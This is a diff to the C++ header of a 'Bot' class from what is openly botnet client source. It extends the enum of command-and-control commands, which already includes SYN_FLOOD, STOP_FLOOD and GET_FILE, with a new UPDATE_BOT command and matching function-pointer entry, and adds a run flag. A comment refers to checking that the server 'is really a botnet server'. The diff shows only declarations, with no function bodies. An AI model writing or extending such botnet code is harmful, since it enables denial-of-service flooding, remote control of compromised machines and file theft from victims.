@@ -29,7 +29,7 @@ private:
 	* Make sure also to write a void(void) function that executes the command
 	* and it to the "func_vector" below, also in the same order as the enum.
 	*/
-	typedef enum { KEEP_ALIVE, PRINT_BOTS, SYN_FLOOD, STOP_FLOOD, GET_INFO, GET_FILE, ARG_CNT } Commands;
+	typedef enum { KEEP_ALIVE, PRINT_BOTS, SYN_FLOOD, STOP_FLOOD, GET_INFO, GET_FILE, UPDATE_BOT, ARG_CNT } Commands;
 	typedef void (Bot::*CommandFunction)();
 	CommandFunction GetCommandFunction(Commands command) {
 		static const std::vector<CommandFunction> func_vector = {
@@ -39,13 +39,15 @@ private:
 			, &Bot::StopFlood
 			, &Bot::GetInfo
 			, &Bot::GetFile
+			, &Bot::UpdateBot
 		};
 
 		return func_vector[command];
 	};
 
-
 	tcpSocket server_connection;
+
+	bool continue_running;
 
 	/**
 	* Checks if server connected to is really a botnet server.
@@ -63,6 +65,7 @@ private:
 	void StopFlood();
 	void GetInfo();
 	void GetFile();
+	void UpdateBot();
 
 	/* Botnet command function helpers */
 
